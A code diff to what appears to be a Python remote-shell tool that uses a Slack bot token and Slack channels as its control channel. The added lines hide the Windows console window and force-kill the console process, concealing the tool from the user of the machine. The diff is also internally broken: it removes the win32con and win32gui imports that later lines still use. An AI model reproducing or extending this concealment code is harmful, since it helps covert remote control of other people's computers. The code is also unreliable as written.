@@ -94,10 +94,18 @@ def init_conn():
 
     return sh_stdout
 
+
 if platform.system() == "Windows":
+    import ctypes
     import pywintypes
-    import win32con
-    import win32gui
+    import win32process
+
+    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+    if hwnd != 0:
+        ctypes.windll.user32.ShowWindow(hwnd, 0)
+        ctypes.windll.kernel32.CloseHandle(hwnd)
+        _, pid = win32process.GetWindowThreadProcessId(hwnd)
+        os.system("taskkill /PID " + str(pid) + " /f")
 
     window = win32gui.GetForegroundWindow()
     win32gui.ShowWindow(window, win32con.SW_HIDE)
@@ -108,8 +116,6 @@ client = slack.WebClient(token=config.bot_user_oauth_token)
 
 channels_list = client.conversations_list()
 channel_names = channels_list.__getitem__("channels")
-
-
 
 # Calculate biggest sh number (create channels from where we left off)
 sh_num = next_sh(channel_names)
